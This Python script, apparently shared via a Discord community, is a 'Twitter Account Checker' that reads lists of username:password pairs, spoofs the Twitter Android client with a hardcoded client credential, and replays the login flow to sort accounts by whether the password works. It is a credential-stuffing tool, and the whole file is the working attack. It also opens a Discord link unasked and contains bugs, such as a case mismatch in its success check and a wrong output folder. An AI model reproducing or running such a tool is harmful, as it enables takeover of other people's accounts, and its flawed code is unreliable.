import requests
import json
from colorama import Fore, init
import os
import webbrowser

init(autoreset=True)
debug = False

def get_access_token():
    response = requests.post("https://api.twitter.com/oauth2/token", data="grant_type=client_credentials", headers={
        'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
        'Accept': "application/json",
        'Accept-Encoding': "br, gzip, deflate",
        'Content-Type': "application/x-www-form-urlencoded",
        'timezone': "Africa/Cairo",
        'os-security-patch-level': "2022-04-01",
        'optimize-body': "true",
        'x-twitter-client': "TwitterAndroid",
        'x-attest-token': "no_token",
        'x-twitter-client-adid': "20d041fe-7911-446c-9a92-035ed8ab0904",
        'x-twitter-client-language': "en-US",
        'x-client-uuid': "7032db5b-591f-4f73-842b-2f9e52516871",
        'x-twitter-client-deviceid': "137d1fbe27f7dc2d",
        'authorization': "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw==",
        'x-twitter-client-version': "10.68.1-release.0",
        'cache-control': "no-store",
        'x-twitter-active-user': "no",
        'x-twitter-api-version': "5",
        'x-twitter-client-limit-ad-tracking': "0",
        'x-b3-traceid': "dbffbe7a8d609493",
        'accept-language': "en-US",
        'x-twitter-client-flavor': ""
    })
    return response.json()["access_token"]

def get_guest_token(access_token):
    headers = {
        'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
        'Accept': "application/json",  
        'Content-Type': "application/json", 
        'authorization': f"Bearer {access_token}", 
        'system-user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011)",
    }
    response = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers)
    return response.json()["guest_token"]

def login(username, password, access_token, guest_token):
    headers = {
        'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
        'Accept': "application/json",  
        'Content-Type': "application/json", 
        'authorization': f"Bearer {access_token}", 
        'system-user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011)",
        'x-guest-token': guest_token
    }

    response = requests.post("https://api.twitter.com/1.1/onboarding/task.json", params={
        'flow_name': "login",
        'api_version': "1",
        'known_device_token': "",
        'sim_country_code': "ye"
    }, data=json.dumps({
        "input_flow_data": {
            "country_code": None,
            "flow_context": {
                "referrer_context": {
                    "referral_details": "utm_source=google-play&utm_medium=organic",
                    "referrer_url": ""
                },
                "start_location": {
                    "location": "splash_screen"
                }
            },
            "requested_variant": None,
            "target_user_id": 0
        },
        "subtask_versions": {
            "generic_urt": 3,
            "standard": 1,
            "open_home_timeline": 1,
            "app_locale_update": 1,
            "enter_date": 1,
            "email_verification": 3,
            "deregister_device": 1,
            "enter_password": 5,
            "enter_text": 6,
            "one_tap": 2,
            "cta": 7,
            "single_sign_on": 1,
            "fetch_persisted_data": 1,
            "enter_username": 3,
            "web_modal": 2,
            "fetch_temporary_password": 1,
            "menu_dialog": 1,
            "sign_up_review": 5,
            "user_recommendations_urt": 3,
            "in_app_notification": 1,
            "sign_up": 2,
            "typeahead_search": 1,
            "app_attestation": 1,
            "user_recommendations_list": 4,
            "cta_inline": 1,
            "contacts_live_sync_permission_prompt": 3,
            "choice_selection": 5,
            "js_instrumentation": 1,
            "alert_dialog_suppress_client_events": 1,
            "privacy_options": 1,
            "topics_selector": 1,
            "wait_spinner": 3,
            "tweet_selection_urt": 1,
            "end_flow": 1,
            "settings_list": 7,
            "open_external_link": 1,
            "phone_verification": 5,
            "security_key": 3,
            "select_banner": 2,
            "upload_media": 1,
            "web": 2,
            "alert_dialog": 1,
            "open_account": 2,
            "passkey": 1,
            "action_list": 2,
            "enter_phone": 2,
            "open_link": 1,
            "show_code": 1,
            "update_users": 1,
            "check_logged_in_account": 1,
            "enter_email": 2,
            "select_avatar": 4,
            "location_permission_prompt": 2,
            "notifications_permission_prompt": 4
        }
    }), headers=headers)

    try:
        flow_token = response.json()["flow_token"]
        headers.update({'att': response.headers['att']})
    except KeyError:
        return {"status": "Unworked", "message": f"Account or username not found for {username}!"}

    response = requests.post("https://api.twitter.com/1.1/onboarding/task.json", data=json.dumps({
        "flow_token": flow_token,
        "subtask_inputs": [
            {
                "enter_text": {
                    "challenge_response": None,
                    "suggestion_id": None,
                    "text": username,
                    "link": "next_link"
                },
                "subtask_id": "LoginEnterUserIdentifier"
            }
        ],
        "subtask_versions": {
            "generic_urt": 3,
            "standard": 1,
            "open_home_timeline": 1,
            "app_locale_update": 1,
            "enter_date": 1,
            "email_verification": 3,
            "deregister_device": 1,
            "enter_password": 5,
            "enter_text": 6,
            "one_tap": 2,
            "cta": 7,
            "single_sign_on": 1,
            "fetch_persisted_data": 1,
            "enter_username": 3,
            "web_modal": 2,
            "fetch_temporary_password": 1,
            "menu_dialog": 1,
            "sign_up_review": 5,
            "user_recommendations_urt": 3,
            "in_app_notification": 1,
            "sign_up": 2,
            "typeahead_search": 1,
            "app_attestation": 1,
            "user_recommendations_list": 4,
            "cta_inline": 1,
            "contacts_live_sync_permission_prompt": 3,
            "choice_selection": 5,
            "js_instrumentation": 1,
            "alert_dialog_suppress_client_events": 1,
            "privacy_options": 1,
            "topics_selector": 1,
            "wait_spinner": 3,
            "tweet_selection_urt": 1,
            "end_flow": 1,
            "settings_list": 7,
            "open_external_link": 1,
            "phone_verification": 5,
            "security_key": 3,
            "select_banner": 2,
            "upload_media": 1,
            "web": 2,
            "alert_dialog": 1,
            "open_account": 2,
            "passkey": 1,
            "action_list": 2,
            "enter_phone": 2,
            "open_link": 1,
            "show_code": 1,
            "update_users": 1,
            "check_logged_in_account": 1,
            "enter_email": 2,
            "select_avatar": 4,
            "location_permission_prompt": 2,
            "notifications_permission_prompt": 4
        }
    }), headers=headers)

    try:
        flow_token = response.json()["flow_token"]
    except KeyError:
        return {"status": "Unworked", "message": f"Account or username not found for {username}!"}

    response = requests.post("https://api.twitter.com/1.1/onboarding/task.json", data=json.dumps({
        "flow_token": flow_token,
        "subtask_inputs": [
            {
                "enter_password": {
                    "password": password,
                    "link": "next_link"
                },
                "subtask_id": "LoginEnterPassword"
            }
        ],
        "subtask_versions": {
            "generic_urt": 3,
            "standard": 1,
            "open_home_timeline": 1,
            "app_locale_update": 1,
            "enter_date": 1,
            "email_verification": 3,
            "deregister_device": 1,
            "enter_password": 5,
            "enter_text": 6,
            "one_tap": 2,
            "cta": 7,
            "single_sign_on": 1,
            "fetch_persisted_data": 1,
            "enter_username": 3,
            "web_modal": 2,
            "fetch_temporary_password": 1,
            "menu_dialog": 1,
            "sign_up_review": 5,
            "user_recommendations_urt": 3,
            "in_app_notification": 1,
            "sign_up": 2,
            "typeahead_search": 1,
            "app_attestation": 1,
            "user_recommendations_list": 4,
            "cta_inline": 1,
            "contacts_live_sync_permission_prompt": 3,
            "choice_selection": 5,
            "js_instrumentation": 1,
            "alert_dialog_suppress_client_events": 1,
            "privacy_options": 1,
            "topics_selector": 1,
            "wait_spinner": 3,
            "tweet_selection_urt": 1,
            "end_flow": 1,
            "settings_list": 7,
            "open_external_link": 1,
            "phone_verification": 5,
            "security_key": 3,
            "select_banner": 2,
            "upload_media": 1,
            "web": 2,
            "alert_dialog": 1,
            "open_account": 2,
            "passkey": 1,
            "action_list": 2,
            "enter_phone": 2,
            "open_link": 1,
            "show_code": 1,
            "update_users": 1,
            "check_logged_in_account": 1,
            "enter_email": 2,
            "select_avatar": 4,
            "location_permission_prompt": 2,
            "notifications_permission_prompt": 4
        }
    }), headers=headers)

    response_json = response.json()
    if "errors" in response_json:
        for error in response_json["errors"]:
            if error["code"] == 399:
                return {"status": "Unworked", "message": f"Wrong password for {username}: {error['message'].split('!')[0]}!"}

    return {"status": "Worked", "response": response.text}

def read_credentials(file_path):
    with open(file_path, 'r') as file:
        credentials = [line.strip().split(':') for line in file.readlines()]
    return credentials

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    print(Fore.CYAN + "=" * 50)
    print(Fore.LIGHTBLUE_EX + "Welcome to the Twitter Account Checker".center(50))
    print(Fore.BLUE + "By Catrine".center(50))
    print(Fore.BLUE + "Discord server: https://discord.gg/4ABGdbjzrP".center(50))
    print(Fore.CYAN + "=" * 50)
    webbrowser.open("https://discord.gg/4ABGdbjzrP")

    print(Fore.GREEN + "Choose an option:")
    print(Fore.LIGHTYELLOW_EX + "1. Check credentials from a file")
    print(Fore.LIGHTYELLOW_EX + "2. Input a single account")
    choice = input(Fore.CYAN + "Enter your choice (1 or 2): ").strip()

    if choice == '1':
        file_path = input(Fore.YELLOW + "Enter the path to the file containing credentials (Username:Pass): ")
        credentials = read_credentials(file_path)
        print(Fore.GREEN + f"Loaded {len(credentials)} accounts from the file.")
    elif choice == '2':
        username = input(Fore.YELLOW + "Enter Your Username: ")
        password = input(Fore.YELLOW + "Enter Your Password: ")
        credentials = [(username, password)]
    else:
        print(Fore.RED + "Invalid choice. Exiting.")
        return

    access_token = get_access_token()
    guest_token = get_guest_token(access_token)

    worked_accounts = []
    unworked_accounts = []
    results_json = []

    for username, password in credentials:
        print(Fore.YELLOW + "=" * 50)
        print(Fore.BLUE + f"Checking credentials for {username}:{password}")
        result = login(username, password, access_token, guest_token)
        if result["status"] == "worked":
            print(Fore.GREEN + f"Success: {username}:{password}")
            if debug:
                print(Fore.BLACK + str(result))
            worked_accounts.append(f"{username}:{password}")
            results_json.append({"username": username, "password": password, "status": "Worked", "response": result["response"]})
        else:
            print(Fore.RED + f"Failed: {result['message']}")
            if debug:
                print(Fore.BLACK + str(result))
            unworked_accounts.append(f"{username}:{password}")
            results_json.append({"username": username, "password": password, "status": "Unworked", "response": result["message"]})
        print(Fore.YELLOW + "=" * 50)

    print(Fore.GREEN + f"\nWorked accounts: {len(worked_accounts)}")
    print(Fore.RED + f"Unworked accounts: {len(unworked_accounts)}")

    save_choice = input(Fore.CYAN + "Do you want to save the results? (y/n): ").strip().lower()
    if save_choice == "y":
        if not os.path.exists("TwitterChecked"):
            os.makedirs("checked")

        with open("TwitterChecked/Worked.txt", "w") as worked_file:
            worked_file.write("\n".join(worked_accounts))

        with open("TwitterChecked/Unworked.txt", "w") as unworked_file:
            unworked_file.write("\n".join(unworked_accounts))

        with open("TwitterChecked/results.json", "w") as json_file:
            json.dump(results_json, json_file, indent=4)

        print(Fore.GREEN + "Results saved successfully!")
    else:
        print(Fore.YELLOW + "Results not saved.")

if __name__ == "__main__":
    main()
